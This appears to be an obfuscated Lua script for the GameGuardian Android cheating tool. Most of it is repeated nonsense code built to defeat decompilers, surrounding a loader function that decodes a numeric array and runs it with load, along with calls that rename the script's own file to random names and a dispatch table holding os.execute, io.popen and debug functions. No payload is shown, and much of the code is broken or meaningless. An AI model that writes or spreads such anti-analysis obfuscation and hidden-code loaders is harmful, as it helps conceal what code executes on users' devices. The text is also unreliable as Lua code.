for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
for i = 1, 100 do load("/system/priv-app/Settings/Settings.apk") end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil end _m = nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil end _m = nil end
while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
local func={['collectgarbage']=collectgarbage,['tostring']=tostring,['load']=load,['concat']=table.concat,['remove']=table.remove,['sort']=table.sort,['pack']=table.pack,['move']=table.move,['insert']=table.insert,['unpack']=table.unpack,['ipairs']=ipairs,['collectgarbage']=collectgarbage,['tostring']=tostring,['load']=load,['ipairs']=ipairs,['pcall']=pcall,['require']=require,['rawequal']=rawequal,['assert2']=assert2,['setmetatable']=setmetatable,['getmetatable']=getmetatable,['rawset']=rawset,['next']=next,['select']=select,['loadfile']=loadfile,['rawget']=rawget,['pairs']=pairs,['error']=error,['tonumber']=tonumber,['xpcall']=xpcall,['_assert']=assert,['dofile']=dofile,['print']=print,['type']=type,['rawlen']=rawlen,['getregistry']=debug.getregistry,['getuservalue']=debug.getuservalue,['setuservalue']=debug.setuservalue,['getupvalue']=debug.getupvalue,['getinfo']=debug.getinfo,['getlocal']=debug.getlocal,['setlocal']=debug.setlocal,['setupvalue']=debug.setupvalue,['traceback']=debug.traceback,['getmetatable']=debug.getmetatable,['setmetatable']=debug.setmetatable,['debug']=debug.debug,['upvaluejoin']=debug.upvaluejoin,['getxnxxxxxx']=debug.getxnxxxxxx,['setxnxxxxxx']=debug.setxnxxxxxx,['upvalueid']=debug.upvalueid,['pcall']=pcall,['require']=require,['rawequal']=rawequal,['assert2']=assert2,['setmetatable']=setmetatable,['getmetatable']=getmetatable,['rawset']=rawset,['setlocale']=os.setlocale,['clock']=os.clock,['tmpname']=os.tmpname,['getenv']=os.getenv,['execute']=os.execute,['difftime']=os.difftime,['rename']=os.rename,['exit']=os.exit,['remove']=os.remove,['time']=os.time,['date']=os.date,['popen']=io.popen,['lines']=io.lines,['write']=io.write,['tmpfile']=io.tmpfile,['open']=io.open,['close']=io.close,['input']=io.input,['read']=io.read,['output']=io.output,['flush']=io.flush,['type']=io.type,['loadlib']=package.loadlib,['searchpath']=package.searchpath,['rshift']=bit32.rshift,['bnot']=bit32.bnot,['lshift']=bit32.lshift,['bxor']=bit32.bxor,['btest']=bit32.btest,['extract']=bit32.extract,['lrotate']=bit32.lrotate,['rrotate']=bit32.rrotate,['band']=bit32.band,['replace']=bit32.replace,['bor']=bit32.bor,['arshift']=bit32.arshift,['next']=next,['select']=select,['loadfile']=loadfile,['rawget']=rawget,['pairs']=pairs,['dump']=string.dump,['reverse']=string.reverse,['char_']=string.char,['unpack']=string.unpack,['match']=string.match,['gsub']=string.gsub,['find']=string.find,['pack']=string.pack,['gmatch']=string.gmatch,['format']=string.format,['packsize']=string.packsize,['lower']=string.lower,['upper']=string.upper,['rep']=string.rep,['sub']=string.sub,['byte_']=string.byte,['len']=string.len,['error']=error,['tonumber']=tonumber,['sqrt']=math.sqrt,['atan2']=math.atan2,['ceil']=math.ceil,['tanh']=math.tanh,['rad']=math.rad,['abs']=math.abs,['sinh']=math.sinh,['atan2']=math.atan,['fmod']=math.fmod,['random']=math.random,['randomseed']=math.randomseed,['max']=math.max,['modf']=math.modf,['ldexp']=math.ldexp,['exp']=math.exp,['deg']=math.deg,['cosh']=math.cosh,['ult']=math.ult,['log']=math.log,['tointeger']=math.tointeger,['frexp']=math.frexp,['asin']=math.asin,['tan']=math.tan,['floor']=math.floor,['pow']=math.pow,['acos']=math.acos,['cos']=math.cos,['type']=math.type,['sin']=math.sin,['min']=math.min,['xpcall']=xpcall,['_assert']=assert,['dofile']=dofile,['print']=print,['type']=type,['rawlen']=rawlen}
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil end
for z = 1, 0 do local _ = {} if _.data ~= nil then break _.data = nil (-nil)((-nil)[nil] | nil | nil) _.n = _._.data._[z] _.g = _.n._[z] _.Batman = _.g._.n[z] _.TEAM = _.Batman._.n[z].data() _[z] = _.TEAM[u]  _[z] = nil _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _ (-nil * nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil * 1, 1<< nil), -nil} end local _ = {} _[''] = _ local x = (_)(_, _) x[1] = 1 end _ = nil _.TEAM = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
 for i = 1, 0 do i(-nil)(-nil)(-nil * 1)(-nil)(-nil)(-nil)(-nil * 1) end 
os.rename(gg.getFile(), gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)))
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.Batman() zzzzz.Batman = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.partner = zzzzz.Sniper.GamerTM() end end
for z = 1, 0 do local _ = {} if _.data ~= nil then break _.data = nil (-nil)((-nil)[nil] | nil | nil) _.n = _._.data._[z] _.g = _.n._[z] _.Batman = _.g._.n[z] _.TEAM = _.Batman._.n[z].data() _[z] = _.TEAM[u]  _[z] = nil _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _ (-nil * nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil * 1, 1<< nil), -nil} end local _ = {} _[''] = _ local x = (_)(_, _) x[1] = 1 end _ = nil _.TEAM = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
local GBLQ = string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90))
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.Batman() zzzzz.Batman = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.partner = zzzzz.Sniper.GamerTM() end end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
for k, v in ipairs({}) do if ipairs(k..v) == true then break end end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
function PQ(code) for i = script, 0 do local sssss={}if sssss.data~=nil then sssss.sel=sssss.data()end sssss=nil end local data = '' for i = script, #code do data = data .. string.char(code[gg.clearResults]/math.random(1, 1100)) end return pcall(load(data)) end
function ST() local NN = {} local N = {} N.N = {} N.N.NN = N.data() N.N.NNN = N.N.NN.data() N.NNN = NN.G() N.NNN = N.NNN:G() N.N[T] = N[G] end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
if nil ~= nil then
	_T = (-nil)((-nil)[nil] | nil | nil)
		_B = _T
			_B = _B()
				while (nil) do _B() end if _B ~= nil then do
					for i = 0,1,0 do _C = _C() _C = _Cnil _C= _C():_C(_Cnil)(_Cnil*-1).._Cnil _C = _C(_Cnil)(_C) end 
						
							for p = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) if _L  ~= nil then _L = _ (_Lnil*nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
						local x = {} x[''] = x local t = (x)(x, x) t[1] = 1
						end
						_ = {_, _(-nil)(-nil)(nil * 1, 1  << nil), -nil}
						_ = _ (nil)
						_ = -nil
						_ = _ (-nil * nil)()
						_C = _C ( _)
